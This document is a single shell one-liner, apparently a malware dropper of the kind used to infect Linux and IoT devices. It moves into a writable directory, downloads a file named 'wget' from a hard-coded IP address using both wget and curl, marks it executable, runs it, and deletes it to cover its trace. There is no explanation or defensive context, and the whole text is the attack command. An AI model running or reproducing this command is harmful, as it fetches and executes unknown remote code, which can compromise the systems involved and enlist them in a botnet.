cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.63.79.64/wget; curl -O http://45.63.79.64/wget; chmod +x wget; ./wget; rm -rf wget
